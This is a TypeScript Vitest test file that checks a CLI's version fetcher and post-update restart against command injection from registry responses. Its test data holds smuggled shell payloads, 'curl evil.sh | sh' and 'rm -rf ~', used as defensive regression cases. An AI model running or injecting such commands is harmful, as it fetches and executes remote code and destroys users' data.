import { describe, it, expect, vi, afterEach } from "vitest";
import { fetchLatestVersion } from "../src/version.js";
import { spawnPostUpdateRestart } from "../src/cli/update.js";

afterEach(() => vi.unstubAllGlobals());

const registryReturns = (body: unknown): void => {
  vi.stubGlobal("fetch", vi.fn(async () => ({
    ok: true,
    json: async () => body,
  })));
};

describe("fetchLatestVersion — registry response is remote input", () => {
  // A malformed value used to be returned verbatim and interpolated into a
  // command line that ran through `sh -c`.
  it.each([
    ["accepts a plain semver", { version: "0.9.1" }, "0.9.1"],
    ["accepts a prerelease tail", { version: "1.0.0-rc.2" }, "1.0.0-rc.2"],
    ["rejects a version carrying shell metacharacters", { version: "1.0.0; curl evil.sh | sh" }, null],
    ["rejects a version with whitespace", { version: "1.0.0 && rm -rf ~" }, null],
    ["rejects a non-string version", { version: 12 }, null],
    ["returns null when the field is absent", {}, null],
  ])("%s", async (_label, body, expected) => {
    registryReturns(body);
    expect(await fetchLatestVersion()).toBe(expected);
  });

  it("returns null for a registry error status, and when the request itself fails", async () => {
    vi.stubGlobal("fetch", vi.fn(async () => ({ ok: false, json: async () => ({ version: "9.9.9" }) })));
    expect(await fetchLatestVersion()).toBeNull();
    vi.stubGlobal("fetch", vi.fn(async () => { throw new Error("getaddrinfo ENOTFOUND"); }));
    expect(await fetchLatestVersion()).toBeNull();
  });
});

describe("spawnPostUpdateRestart", () => {
  it("passes the reason as a single argv entry", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, args] = spawnFn.mock.calls[0] as unknown as [string, string[], object];
    expect(args).toContain("--reason");
    expect(args[args.indexOf("--reason") + 1]).toBe("Updated from v0.8.14 to v0.8.15");
    // The whole point: the reason must not have been split into positionals.
    expect(args[args.length - 1]).toBe("Updated from v0.8.14 to v0.8.15");
  });

  it("does not route the command line through a shell", () => {
    const spawnFn = vi.fn(() => ({ on: vi.fn() }));
    spawnPostUpdateRestart("0.8.14", "0.8.15", spawnFn as never);
    const [, , options] = spawnFn.mock.calls[0] as unknown as [string, string[], { shell?: boolean }];
    expect(options.shell).toBeUndefined();
  });
});
